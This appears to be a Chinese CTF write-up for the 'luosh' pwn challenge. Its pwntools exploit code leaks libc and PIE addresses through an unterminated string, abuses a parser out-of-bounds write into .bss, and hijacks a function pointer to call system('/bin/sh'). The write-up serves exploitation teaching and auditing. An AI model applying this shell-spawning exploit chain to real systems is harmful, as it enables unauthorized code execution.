# luosh

## 题目简述

自制 Shell 的预期解与堆无关，利用链分三步：无效命令报错时的未终止字符串泄漏、解析器“先写后检查”导致的越界写，以及 `luofuck` 对 `.bss` 命令索引缺少边界检查所形成的函数指针劫持。

## 解题过程

### 1. 泄漏 libc 与 PIE

输入缓冲区未被强制以 `\x00` 结尾。不存在的命令会被当作字符串原样输出，于是分别填满不同长度的栈缓冲区，让输出继续越过边界，取到残留的 `_IO_2_1_stderr_` 指针和 `main` 地址：

```python
io.sendafter(b">", b"a" * 0x188)
io.recvuntil(b"a" * 0x188)
libc.address = u64(io.recvn(6).ljust(8, b"\x00")) - libc.sym["_IO_2_1_stderr_"]

io.sendafter(b">", b"a" * 0x200)
io.recvuntil(b"a" * 0x200)
elf.address = u64(io.recvn(6).ljust(8, b"\x00")) - elf.sym["main"]
```

### 2. 利用解析器越界写

先创建 `file1` 并准备一条可被 `luofuck` 重放的命令。解析器在确认参数个数是否合法之前已经把解析结果写入 inode 数组，因此超长 `ls` 参数可越界改写目标地址和写入内容。题目额外禁止把目标直接放在栈或 libc，故把写原语落到程序自身 `.bss`：

```python
io.sendlineafter(b">", b"touch file1")
io.sendlineafter(b">", b"echo " + b"a" * 0x1F + b" > file1")

payload = b"ls " + b"a " * 10
payload += b"\x11" * 8 + p64(elf.address + 0x4060 - 8)[:6]
payload += b" " + b"\x10" * 16 + p64(libc.sym["system"])[:6]
io.sendlineafter(b">", payload)
```

这次写把 `luofuck` 使用的索引附近数据和函数指针改成可控值。结构体步长为 `0x18`，目标函数项相距 `0x528`，所以伪造索引为 `0x528 // 0x18`；在索引前放入 `/bin/sh;`，让被劫持到 `system` 的调用参数先执行 shell：

```python
payload = b"echo /bin/sh;" + p64(0x528 // 0x18) + b" > file1"
io.sendlineafter(b">", payload.replace(b"\x00", b""))
io.sendlineafter(b">", b"luofuck")
```

整合脚本的初始化部分为：

```python
from pwn import ELF, p64, remote, u64

elf = ELF("./pwn")
libc = ELF("./libc.so.6", checksec=False)
io = remote("host", 10000)
```

上面的 `0x188`、`0x200`、`0x4060` 和 `0x528` 都来自本题二进制的具体栈帧与全局结构布局，不能跨版本照搬。

## 方法总结

复杂菜单程序应按“解析—存储—执行”分层审计。本题的决定性组合是：错误输出泄漏地址，解析阶段获得受限任意写，执行阶段再借 `.bss` 索引越界跨过写目标限制。看到自制文件系统或 inode 不代表必须打堆，先追踪对象实际存储位置和函数指针消费者更有效。
